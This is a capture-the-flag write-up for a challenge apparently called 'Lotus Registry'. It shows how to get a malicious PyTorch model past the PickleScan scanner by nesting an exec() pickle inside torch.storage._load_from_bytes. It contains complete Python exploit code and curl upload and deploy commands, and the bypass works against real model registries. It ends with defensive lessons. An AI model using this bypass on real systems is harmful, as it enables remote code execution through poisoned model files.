# Lotus Registry

## Category

AI

## Difficulty

Medium

## Summary

The Lotus Registry serves ML sensor models over HTTP and uses PickleScan to block malicious
PyTorch uploads. PickleScan inspects the outermost pickle opcode stream but does not recurse
into nested payloads. By wrapping a classic `exec()` pickle inside a call to
`torch.storage._load_from_bytes` (a whitelisted operator), the inner payload passes static
analysis undetected. Triggering deployment executes the nested code on the server before
PyTorch raises an "Invalid magic number" error, and the flag appears in the response body.

## Provided Files

None (Docker instance only). The challenge exposes a registry server and a `lotus-malsensor-mk2`
model repository accessible to a low-privileged maintainer account.

## Tools Used

- Python 3
- PyTorch (`torch`)
- curl

## Walkthrough

1. Enumerate the registry API. Two relevant endpoints are present:
   - `POST /api/upload` accepts arbitrary model file uploads; `.pkl` and `.pickle` extensions
     are blocked, but `pytorch_model.bin` is not on the deny list.
   - `POST /api/deploy` loads and instantiates the most recently uploaded model file.

2. Understand the PickleScan bypass. PickleScan walks the opcode stream of the top-level
   pickle and flags known dangerous globals (`os.system`, `subprocess`, `exec`, etc.). It
   does not deserialize nested byte strings, so a pickle whose sole top-level opcode is a
   call to a whitelisted function is passed without inspection of that function's arguments.

3. Build the two-layer exploit. The inner pickle invokes `exec()` with arbitrary Python code.
   The outer pickle calls `torch.storage._load_from_bytes(inner_bytes)`, which is whitelisted.
   When PyTorch deserializes the outer pickle it calls `_load_from_bytes`, which in turn
   deserializes the inner pickle and executes the payload.

   ```python
   import torch, io, pickle, zipfile

   code = '''
   import os, sys
   print(os.popen("/readflag").read())
   sys.stdout.flush()
   '''

   class Evil:
       def __reduce__(self): return (exec, (code,))

   inner = pickle.dumps(Evil(), protocol=2)

   class Outer:
       def __reduce__(self): return (torch.storage._load_from_bytes, (inner,))

   outer = pickle.dumps(Outer(), protocol=2)

   buf = io.BytesIO()
   with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as z:
       z.writestr('archive/data.pkl', outer)
       z.writestr('archive/version', b'2')

   open('/tmp/exploit.bin', 'wb').write(buf.getvalue())
   ```

4. Run the build script, then upload the resulting file as `pytorch_model.bin`:

   ```bash
   python3 build_exploit.py

   curl -s -X POST \
     -F "file=@/tmp/exploit.bin;filename=pytorch_model.bin" \
     http://<target-ip>:<target-port>/api/upload
   ```

5. Trigger deployment. The server deserializes the model, the payload runs, and the flag
   is printed to stdout before PyTorch raises its error. The flag appears in the HTTP
   response body:

   ```bash
   curl -s -X POST http://<target-ip>:<target-port>/api/deploy
   ```

## Key Findings

- PickleScan performs shallow opcode inspection only; nested pickles passed as byte-string
  arguments to whitelisted callables are never scanned.
- `torch.storage._load_from_bytes` is whitelisted because it is a standard PyTorch internal,
  yet it accepts and deserializes arbitrary pickle bytes.
- The extension deny list blocked `.pkl` / `.pickle` but not `.bin`, leaving a trivial upload
  bypass alongside the deeper scanner bypass.
- Code execution occurs at deserialization time (deploy step), not at upload time.

## Final Answer

`Flag: HTB{5upply_ch41n_my_w4y_t0_wh173_l0tu5}`

## Lessons Learned

PickleScan-style static analysis must recursively inspect every byte string that will be
passed to a deserializer, not just the top-level opcode stream. Any model registry that
relies on pickle deserialization under the hood should be treated as an arbitrary code
execution surface regardless of the scanner in front of it.
